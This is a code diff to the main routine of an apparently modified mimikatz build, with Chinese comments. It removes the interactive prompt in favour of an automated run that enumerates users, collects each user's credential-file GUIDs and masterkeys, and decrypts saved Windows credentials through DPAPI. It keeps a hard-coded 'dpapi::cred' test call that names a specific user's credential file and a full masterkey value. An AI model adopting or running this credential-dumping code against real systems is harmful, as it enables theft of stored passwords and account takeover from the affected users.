@@ -56,30 +56,8 @@ int wmain(int argc, wchar_t * argv[])
 #ifndef _WINDLL
 
 
-	//while (status != STATUS_FATAL_APP_EXIT)
-	//{
-	//	kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
-	//	if (fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
-	//	{
-	//		if (input[len - 1] == L'\n')
-	//			input[len - 1] = L'\0';
-	//		kprintf_inputline(L"%s\n", input);
-	//		status = mimikatz_dispatchCommand(input);
-	//	}
-	//}
-
 	while (status != STATUS_FATAL_APP_EXIT)
 	{
-		//kprintf(L"\n" MIMIKATZ L" # "); flush(stdin);
-		//if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n')) //直接运行等待输入
-		//{
-			//if(input[len - 1] == L'\n')
-			//	input[len - 1] = L'\0';
-
-			//kprintf_inputline(L"%s\n", input); //获取参数
-			//status = mimikatz_dispatchCommand(input);
-		//}
-
 
 		//获取用户信息
 		Getalluser();
@@ -116,16 +94,12 @@ int wmain(int argc, wchar_t * argv[])
 			{
 				break;
 			}
-
 			i++;
-
-			//} while (i < _countof(user_info));
 		} while (i < g_user_info_flag);
 		
 			
 
 		// 4、 用户名终端会话记录目录文件的GUID
-		//for (int i = 0; i < _countof(file_info); i++)
 		for (int i = 0; i < g_file_info_flag; i++)
 		{
 			if (wcscmp(file_info[i].filepath, L""))
@@ -146,8 +120,6 @@ int wmain(int argc, wchar_t * argv[])
 		}
 
 		//测试
-
-		
 		status = mimikatz_dispatchCommand(L"dpapi::cred /in:C:\Users\AT\AppData\Local\Microsoft\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:1955edf764404b2bc6cf8b60b6719b20c78982e3e11493639d7e975e8ce8a6977fff4364de6858724ce8bc4f704b47937ab2eefe7c171c8d1f18e2ac6ee6c0da");
 
 		// 4.2、根据GUID获取对应的Masterkey
@@ -163,7 +135,7 @@ int wmain(int argc, wchar_t * argv[])
 
 		// 5、注入 masterkey解密
 		//kprintf(L"\n========== dpapi::cred /in:D:\\dir_path(*) /masterkey:*  =========\n");
-		//for (int i = 0; _countof(file_info); i++)
+		//for (int i = 0; i<(fileinfo_flag+1); i++)
 		//{
 		//	//for (int j = i + 1; j < _countof(guidMasterKey);j++)
 		//	//{
@@ -188,8 +160,6 @@ int wmain(int argc, wchar_t * argv[])
 		//}
 
 
-		// 5、注入 masterkey解密
-		//kprintf(L"\n========== dpapi::cred /in:D:\\dir_path(*) /masterkey:*  =========\n");
 
 
 
